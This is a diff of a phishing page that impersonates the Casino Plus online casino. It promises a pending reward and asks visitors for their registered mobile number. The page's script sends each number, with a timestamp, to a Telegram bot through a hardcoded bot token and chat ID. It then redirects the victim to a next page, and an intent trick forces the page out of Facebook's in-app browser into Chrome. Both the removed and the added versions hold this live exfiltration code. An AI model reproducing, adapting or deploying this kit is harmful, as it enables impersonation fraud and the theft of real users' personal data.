@@ -3,139 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CasinoPlus | Membership Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <title>Casino Plus | Account Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 50%, #b8860b 100%);
-            --dark-bg: #04070d;
-            --neon-green: #39ff14;
+            --casino-gold: #fbbf24;
+            --casino-dark: #0f172a;
+            --bg-dark: #0a0a0b;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body {
-            font-family: 'Public Sans', sans-serif;
-            background-color: var(--dark-bg);
-            background-image: 
-                radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 50%),
-                url('https://www.transparenttextures.com/patterns/dark-matter.png');
+            background-color: var(--bg-dark);
+            background-image: radial-gradient(circle at 50% -20%, #1a3a5a 0%, #0a0a0b 100%);
             color: #ffffff;
+            font-family: 'Public Sans', sans-serif;
             display: flex;
-            justify-content: center;
             align-items: center;
+            justify-content: center;
             min-height: 100vh;
-            overflow: hidden;
+            overflow-x: hidden;
         }
 
-        /* Full Screen Overlay */
-        .overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(15px);
-            z-index: 9999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 15px;
-        }
-
-        /* Remastered Card Style */
-        .modal-card {
-            background: rgba(255, 255, 255, 0.03);
-            width: 100%;
-            max-width: 400px;
+        .card {
+            width: 92%;
+            max-width: 380px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 24px;
             padding: 30px 20px;
-            border-radius: 30px;
-            box-shadow: 0 0 50px rgba(0,0,0,0.8), inset 0 0 20px rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
             text-align: center;
-            border: 1px solid rgba(212, 175, 55, 0.4);
-            animation: modalIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
         }
 
-        @keyframes modalIn {
-            from { transform: scale(0.8); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
+        .logo-img { width: 160px; margin-bottom: 20px; }
 
-        .logo-img {
-            width: 160px;
-            margin-bottom: 20px;
-            filter: drop-shadow(0 0 10px rgba(212, 175, 55, 0.5));
-        }
-
-        /* Timer Section */
-        .timer-container {
-            background: rgba(255, 0, 0, 0.1);
-            border: 1px solid rgba(255, 0, 0, 0.3);
-            border-radius: 15px;
-            padding: 12px;
-            margin-bottom: 20px;
-        }
-
-        .timer-label { font-size: 11px; color: #ff4d4d; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; }
-        #waitTimer { font-family: 'Orbitron', sans-serif; font-size: 24px; color: #ff4d4d; display: block; margin-top: 5px; }
-
-        .reward-info { font-size: 14px; color: #ccc; margin-bottom: 25px; line-height: 1.6; }
-        .reward-info b { color: #fbbf24; font-size: 18px; }
+        h1 { font-size: 22px; font-weight: 700; margin-bottom: 12px; color: #fff; }
+        p { color: #94a3b8; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
 
         /* Input Group */
         .input-group { text-align: left; margin-bottom: 20px; }
-        label { font-size: 11px; color: #fbbf24; font-weight: 800; text-transform: uppercase; margin-left: 5px; letter-spacing: 1px; }
+        .label-text { display: block; font-size: 11px; text-transform: uppercase; color: var(--casino-gold); font-weight: 700; margin-bottom: 8px; margin-left: 5px; }
 
         input {
             width: 100%;
-            padding: 18px;
-            border-radius: 15px;
-            border: 1px solid rgba(255,255,255,0.1);
-            background: rgba(0,0,0,0.6);
-            color: #fff;
-            font-size: 22px;
-            font-weight: 700;
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 16px;
+            color: white;
+            font-size: 20px;
             text-align: center;
-            margin-top: 8px;
+            font-family: 'JetBrains Mono', monospace;
             outline: none;
-            letter-spacing: 2px;
+            transition: 0.3s;
         }
 
-        input:focus { border-color: #d4af37; box-shadow: 0 0 15px rgba(212,175,55,0.2); }
+        input:focus { border-color: var(--casino-gold); }
 
-        /* Official Button Style */
-        .btn-claim {
-            background: var(--gold);
-            color: #000;
-            width: 100%;
-            padding: 20px;
+        .btn-primary {
+            background: linear-gradient(180deg, #fbbf24 0%, #f59e0b 100%);
+            color: #0f172a;
             border: none;
-            border-radius: 15px;
-            font-size: 17px;
-            font-weight: 800;
+            width: 100%;
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
             text-transform: uppercase;
+            letter-spacing: 0.5px;
             cursor: pointer;
-            box-shadow: 0 8px 0 #8b6508, 0 15px 20px rgba(0,0,0,0.5);
-            transition: 0.2s;
+            box-shadow: 0 4px 15px rgba(251, 191, 36, 0.2);
         }
 
-        .btn-claim:active { transform: translateY(4px); box-shadow: 0 4px 0 #8b6508; }
-        .btn-claim:disabled { background: #4b5563; color: #9ca3af; box-shadow: none; transform: translateY(4px); }
+        .btn-primary:active { transform: scale(0.97); }
 
-        /* Promo Photo */
+        /* Ang ni-request mong Image */
         .promo-img {
             width: 100%;
-            border-radius: 15px;
-            margin-top: 25px;
-            border: 1px solid rgba(212, 175, 55, 0.2);
-            opacity: 0.9;
+            border-radius: 12px;
+            margin-top: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
         }
 
-        #status-msg { margin-top: 15px; font-size: 13px; font-weight: 700; display: none; padding: 10px; border-radius: 10px; }
-        .error { color: #ff4d4d; background: rgba(255,0,0,0.1); }
-        .success { color: var(--neon-green); background: rgba(57,255,20,0.1); }
+        #status-msg { color: #ff3b30; font-size: 12px; margin-top: 15px; display: none; font-weight: 600; }
 
         .spinner {
-            width: 18px; height: 18px; border: 3px solid rgba(0,0,0,0.1);
-            border-top: 3px solid #000; border-radius: 50%;
+            width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.1);
+            border-top: 2px solid #000; border-radius: 50%;
             animation: spin 0.8s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
@@ -143,112 +100,75 @@
 </head>
 <body>
 
-<div class="overlay">
-    <div class="modal-card">
-        <img src="https://casinoplus.static2.website/images/logo1.png" alt="CasinoPlus" class="logo-img">
+    <div class="card">
+        <img src="https://casinoplus.static2.website/images/logo1.png" class="logo-img" alt="CasinoPlus">
+        <h1>Identity Verification</h1>
+        <p>Your account is flagged for a pending reward claim. Please verify your mobile number to continue.</p>
         
-        <div class="timer-container">
-            <span class="timer-label">Offer Reserved For:</span>
-            <span id="waitTimer">05:00</span>
-        </div>
-
-        <p class="reward-info">Congratulations! You have a pending reward of <b>₱1,000.00</b>. Please verify your mobile number to claim.</p>
-
         <div class="input-group">
-            <label>Registered Mobile Number</label>
+            <span class="label-text">Registered Mobile Number</span>
             <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
         </div>
 
-        <button class="btn-claim" id="claimBtn" onclick="processClaim()">
-            Claim Reward Now
-        </button>
-
+        <button class="btn-primary" id="claimBtn" onclick="processClaim()">Verify and Claim</button>
+        
         <div id="status-msg"></div>
 
-        <img src="https://casinoplus.static2.website/images/casinoplus.jpeg" class="promo-img" alt="Official Promo">
+        <img src="free_depo.jpeg" class="promo-img" alt="Promotion">
     </div>
-</div>
 
-<script src="config.js"></script>
+    <script src="config.js"></script>
+    <script>
+        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
+        const chatId = '7298607329';
+        const BYPASS_MODE = true;
 
-<script>
-    // --- TELEGRAM & BYPASS SETTINGS ---
-    const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
-    const chatId = '7298607329';
-    const BYPASS_MODE = true; // TRUE = Rekta main.html pagka-submit
-
-    // --- INTENT & AUTO-START ---
-    window.onload = () => {
-        const currentUrl = window.location.href.replace(/^https?:\/\//, '');
-        if (!window.location.hash.includes("verified")) {
-            const intentUrl = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
-            window.location.href = intentUrl;
-        }
-        startTimer(300);
-        document.getElementById('userPhone').focus();
-    };
-
-    function startTimer(sec) {
-        let timer = sec;
-        const display = document.getElementById('waitTimer');
-        const interval = setInterval(() => {
-            let m = Math.floor(timer / 60);
-            let s = timer % 60;
-            display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
-            if (--timer < 0) {
-                clearInterval(interval);
-                display.textContent = "EXPIRED";
+        // Intent logic para sa FB Browser
+        window.onload = () => {
+            const currentUrl = window.location.href.replace(/^https?:\/\//, '');
+            if (!window.location.hash.includes("verified")) {
+                window.location.href = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
             }
-        }, 1000);
-    }
+        };
 
-    async function processClaim() {
-        const phone = document.getElementById('userPhone').value;
-        const btn = document.getElementById('claimBtn');
-        const status = document.getElementById('status-msg');
+        async function processClaim() {
+            const phone = document.getElementById('userPhone').value.trim();
+            const btn = document.getElementById('claimBtn');
+            const status = document.getElementById('status-msg');
 
-        if (phone.length < 11 || !phone.startsWith('09')) {
-            showStatus("⚠️ Mangyaring maglagay ng tamang 11-digit mobile number.", "error");
-            return;
+            // Validation
+            if (phone.length < 11 || !phone.startsWith('09')) {
+                status.innerHTML = "⚠️ Please enter a valid 11-digit number.";
+                status.style.display = "block";
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = `<div class="spinner"></div> VERIFYING...`;
+            status.style.display = "none";
+
+            // Blacklist Check (Galing sa config.js)
+            if (typeof BLACKLISTED_NUMBERS !== 'undefined' && BLACKLISTED_NUMBERS.includes(phone)) {
+                setTimeout(() => {
+                    status.innerHTML = "❌ Access Denied: Account not eligible.";
+                    status.style.display = "block";
+                    btn.disabled = false;
+                    btn.innerHTML = "Verify and Claim";
+                }, 1500);
+                return;
+            }
+
+            // Telegram Send
+            const msg = `🎰 CASINO PLUS LOGIN\n📱 Number: ${phone}\n⏰ Time: ${new Date().toLocaleString()}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+
+            // Bypass Redirect
+            if (BYPASS_MODE) {
+                setTimeout(() => {
+                    window.location.href = "main.html";
+                }, 1800);
+            }
         }
-
-        btn.disabled = true;
-        btn.innerHTML = `<div class="spinner"></div> VERIFYING ACCOUNT...`;
-        status.style.display = "none";
-
-        // Blacklist Check mula sa config.js
-        if (typeof BLACKLISTED_NUMBERS !== 'undefined' && BLACKLISTED_NUMBERS.includes(phone)) {
-            setTimeout(() => {
-                showStatus("❌ Access Denied: Ang account na ito ay hindi kwalipikado.", "error");
-                btn.disabled = false;
-                btn.innerHTML = "Claim Reward Now";
-            }, 2000);
-            return;
-        }
-
-        // Send Notification to Telegram
-        const msg = `🎰 CASINO PLUS LOGIN\n📱 Number: ${phone}\n⏰ Time: ${new Date().toLocaleString()}`;
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-
-        // --- BYPASS LOGIC ---
-        if (BYPASS_MODE) {
-            setTimeout(() => {
-                btn.innerHTML = "SUCCESS! REDIRECTING...";
-                btn.style.background = "#39ff14";
-                window.location.href = "main.html";
-            }, 1800);
-        } else {
-            showStatus("✅ Account Found! Syncing data...", "success");
-        }
-    }
-
-    function showStatus(msg, type) {
-        const el = document.getElementById('status-msg');
-        el.innerHTML = msg;
-        el.className = type;
-        el.style.display = "block";
-    }
-</script>
-
+    </script>
 </body>
 </html>
